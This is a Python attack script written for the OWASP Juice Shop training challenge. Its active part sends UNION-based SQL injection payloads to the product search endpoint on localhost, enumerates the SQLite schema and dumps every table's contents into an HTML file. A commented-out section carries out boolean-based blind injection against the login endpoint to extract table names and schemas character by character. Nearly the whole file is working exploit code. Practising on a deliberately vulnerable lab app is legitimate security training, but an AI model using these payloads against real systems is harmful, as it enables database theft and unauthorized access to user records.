#Author: Waseem Akram (waseem07799@gmail.com)
# -*- coding: utf-8 -*-
#Error and Boolean based SQL injection for OWASP juice shop challenge



import requests 
import os


#Error based SQL Injection

html = '''<html>
<body>
<style>
table {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width: 100%;
}

td, th {
  border: 1px solid #dddddd;
  text-align: left;
  padding: 8px;
}

tr:nth-child(even) {
  background-color: #dddddd;
}
</style>
'''

def extractColumnsFromCreateSchema(schema):
	schema = schema.replace('(',',',1)
	schema = schema.replace(')','')
	schema = schema.replace('`','')
	schema = schema.replace(', ',',')
	schema = schema.replace(' ,',',')
	schema = schema.split(',')
	tablename = schema.pop(0).split(' ').pop()
	columns = [s.split(' ')[0] for s in schema ]
	excl = [' ','CREATE','TABLE','INTEGER','PRIMARY','KEY','AUTOINCREMENT','VARCHAR(255)','REFERENCES','VARCHAR','NOT NULL','UNIQUE','DATETIME','NOT' 'ON','DELETE','SET','NULL','UPDATE','CASCADE','NOT ','ONON']
	for exc in excl:
		if exc in columns:
			columns.remove(exc)
	return tablename,columns

def extract(payload):
	q = f"a' AND 1=0)) {payload} --"
	r = requests.get(f'http://localhost:3000/rest/products/search?q={q}')
	data = r.json()
	return data['data']

tables = extract("UNION select 1,sql,3,4,5,6,7,8,9 from sqlite_master where sql NOT NULL AND name not like 'sqlite_%25'  order by 1 asc limit (select count(sql) from sqlite_master)")
tables = [table['name'] for table in tables]
totaltables = len(tables)
for index,table in enumerate(tables):
	print(f"Fetching db: {int((index/totaltables)*100)}%",end='\r')
	tablename,columns = extractColumnsFromCreateSchema(table)
	html += f'<h2>{tablename}</h2><table>'
	allrows = []
	html += '<tr>'
	for colname in columns:
		data = extract(f"UNION select 1,{colname},3,4,5,6,7,8,9 from {tablename} where {colname} NOT NULL order by 1 asc limit (select count({colname}) from {tablename})")
		data = [d['name'] for d in data]
		allrows.append(data)
		html += f'<th>{colname}</th>'
	html += '</tr>'
	maxlen = max([len(x) for x in allrows])
	for i,row in enumerate(allrows):
		currowlen = len(row)
		allrows[i] = ["NULL"]*(maxlen - currowlen) + row
	for i in range(maxlen):
		html += '<tr>'
		for row in allrows:
			html += f'<td>{row[i]}</td>'
		html += '</tr>'
	html += f'</table><br>'

html += '''
</body>
</html>'''
print(f"Fetching db: 100%",end='\r')
print()

# print(html)
with open('database.html','w') as f:
	f.write(html)
print("Saved db as database.html....")
print("Opening db page")
os.system('firefox database.html')


#Boolean based SQL injection

#alp = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$%&()*+./:;<=>?@[]^,_+-{|}~ "

# def check(payload):
# 	data = {"email":f"admin@juice-sh.op' {payload} --","password":"hack"}
# 	headers = {"Content-Type": "application/json"}
# 	r = requests.post('http://localhost:3000/rest/user/login',data,headers)
# 	return not "Invalid email or password" in r.text


#exfil
#AND hex(substr((select 'waseem'),1,1)) = hex('a')

# tablecount = 0
#tablecount
# select count(tbl_name) from sqlite_master;
# print("Finding total number of tables...")

# for tablecount in range(1,100):
# 	payload = f"AND (select count(tbl_name) from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%')={tablecount}"
# 	if check(payload):
		# break

# print(f"No of Tables: {tablecount}")
# table names
# founded_tables = [
# "Users",
# "Addresse",
# "Basket",
# "Product",
# "BasketItem",
# "Captcha",
# "Card",
# "Challenge",
# "Complaint",
# "Deliverie",
# "Feedback",
# "ImageCaptcha",
# "Memorie",
# "PrivacyRequest",
# "PurchaseQuantitie",
# "Quantitie",
# "Recycle",
# "SecurityQuestion",
# "SecurityAnswer",
# "Wallet"]

# print("\n Tables")
# print("-------------------")
# tables = []
# for table in range(tablecount):
# 	#find table name length
# 	for tablen in range(1,100):
# 		payload = f"AND (select length(tbl_name) from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {table})={tablen}"
# 		if check(payload):
# 			#tablen found, now exfilterate table name
# 			tables.insert(table,"")
# 			print(f"tablenamelen: {tablen}")
# 			for l in range(1,tablen):
# 				for a in alp:
# 					print(tables[table]+a,end='\r')
# 					payload = f"AND hex(substr((select tbl_name from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {table}),{l},1)) = hex('{a}')"
# 					if check(payload):
# 						tables[table] += a
# 						print(" "*50,end='\r')
# 			print(" "*50,end='\r')
# 			print(tables[table])


#find no of columns for each table
# data = {}
# for table in founded_tables:
# 	data[table] = []
# 	#find the length of column name
# 	with open(f'{table}.cols','a') as f:
# 		for collen in range(2000):
# 			print(f"Checking for {table}: {collen}",end='\r')
# 			payload = f"AND (select length(sql) from sqlite_master where tbl_name LIKE '{table}%' AND type='table')={collen}"
# 			if check(payload):
# 				print()
# 				s = ""
# 				# column name length found, now exfil..
# 				for index in range(1,collen):
# 					print(f"fetching schema for {table}: {(index/collen)*100}%",end='\r')
# 					for a in alp:
# 						payload = f"AND hex(substr((select sql from sqlite_master where tbl_name LIKE '{table}%' AND type='table' limit 1),{index},1)) = hex('{a}')"
# 						if check(payload):
# 							s += a
# 							f.write(a)
# 				data[table].append(s)
# 				f.write('\n')
# 				print()
# 				break
